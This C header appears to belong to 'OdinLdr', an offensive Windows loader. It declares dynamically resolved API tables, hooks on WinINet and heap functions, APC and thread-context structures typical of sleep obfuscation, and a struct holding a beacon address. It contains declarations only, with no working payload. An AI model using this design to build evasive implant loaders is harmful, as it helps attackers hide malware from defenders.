#pragma once
#include <Windows.h>

#include "macro.h"

#define ODIN_OFFSET	12

MACRO_STR(odinPattern, "OdinLdr1337");

/* ------------------------
	Dynamicly solve API call
------------------------ */

typedef struct _KERNEL32_FUNCTION {
	void* VirtualAlloc;
	void* VirtualProtect;
	void* VirtualFree;
	void* CreateThread;
	void* GetThreadContext;
	void* SetThreadContext;
	void* ResumeThread;
	void* HeapCreate;
} KERNEL32_FUNCTION, *PKERNEL32_FUNCTION;

typedef struct _NTDLL_FUNCTION {
	void* LdrLoadDll;
	void* RtlAnsiStringToUnicodeString;
	void* LdrGetProcedureAddress;
	void* RtlLookupFunctionEntry;
	void* TpReleaseCleanupGroupMembers;
	void* RtlCaptureContext;
	void* RtlExitUserThread;
	void* NtContinue;
} NTDLL_FUNCTION, *PNTDLL_FUNCTION;

typedef struct _INSTANCE {
	KERNEL32_FUNCTION k32;
	NTDLL_FUNCTION ntdll;
} INSTANCE, * PINSTANCE;


typedef struct _INSTANCE_APC {

	// KERNEL32.DLL

	void* CreateEventW;
	void* CreateThread;
	void* VirtualProtect;
	void* QueueUserApc;
	void* CloseHandle;
	void* GetThreadContext;
	void* WaitForSingleObject;

	// NTDLL.DLL

	void* NtTestAlert;
	void* RtlExitUserThread;
	void* NtContinue;
	void* TpReleaseCleanupGroupMembers;
	void* RtlRandom;
	void* NtQueryVirtualMemory;
	void* NtSetInformationVirtualMemory;
	void* NtSignalAndWaitForSingleObject;
	void* NtResumeThread;

	// CRYPTSP.DLL

	void* SystemFunction032;

} INSTANCE_APC, *PINSTANCE_APC;

/* ------------------------
	Function hooked
------------------------ */

typedef struct _HOOK_INFO {
	DWORD dwFunctionHash;
	void* pHook;
} HOOK_INFO, *PHOOK_INFO;

typedef struct _HOOK_LIST {

	// WININEET.DLL

	HOOK_INFO InternetOpenA;
	HOOK_INFO InternetCloseHandle;
	HOOK_INFO InternetReadFile;
	HOOK_INFO InternetConnectA;
	HOOK_INFO InternetQueryDataAvailable;
	HOOK_INFO InternetQueryOptionA;
	HOOK_INFO InternetSetOptionA;
	HOOK_INFO InternetSetStatusCallback;
	HOOK_INFO HttpOpenRequestA;
	HOOK_INFO HttpAddRequestHeadersA;
	HOOK_INFO HttpSendRequestA;
	HOOK_INFO HttpQueryInfoA;

	// KERNEL32.DLL

	HOOK_INFO GetProcessHeap;
	HOOK_INFO Sleep;
	HOOK_INFO WaitForSingleObject;
	HOOK_INFO ExitThread;
	HOOK_INFO HeapAlloc;
	HOOK_INFO HeapCreate;

	// NTDLL

	HOOK_INFO RtlAllocateHeap;

} HOOK_LIST, * PHOOK_LIST;

/* ------------------------
	Loader information
------------------------ */

typedef struct _LOADER_INFO {
	PVOID   pLoaderAddr;
	DWORD   dwLoaderSize;
} LOADER_INFO, * PLOADER_INFO;

typedef struct _ODIN {
	void* pBeaconAddr;
	SIZE_T stSize;
	HANDLE hHeap;
} ODIN, * PODIN;

BOOL InitInstance(PINSTANCE Inst);
BOOL InitInstanceAPC(PINSTANCE_APC Inst);